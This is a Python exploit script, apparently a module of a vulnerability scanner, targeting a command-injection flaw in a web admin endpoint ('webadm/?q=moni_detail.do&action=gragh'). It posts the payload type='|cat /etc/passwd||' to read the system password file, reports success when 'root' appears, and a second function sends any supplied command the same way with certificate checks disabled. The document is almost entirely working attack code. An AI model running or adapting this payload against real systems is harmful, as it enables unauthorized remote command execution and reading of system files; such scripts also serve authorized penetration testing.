import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import sys
import random
import re


    
def Yiyou_rce(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url = urldata + "webadm/?q=moni_detail.do&action=gragh"
    headers = {
            "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "type='|cat /etc/passwd||'"
    cmd = 'cat /etc/passwd'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        print("\033[32m[o] 正在请求 {}webadm/?q=moni_detail.do&action=gragh \033[0m".format(urldata))
        if "root" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \033[0m".format(urldata))
            # print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
            
            POC_2(urldata, cmd)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


def POC_2(urldata, cmd):
    vuln_url = urldata + "/webadm/?q=moni_detail.do&action=gragh"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "type='|{}||'".format(cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
        # print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)



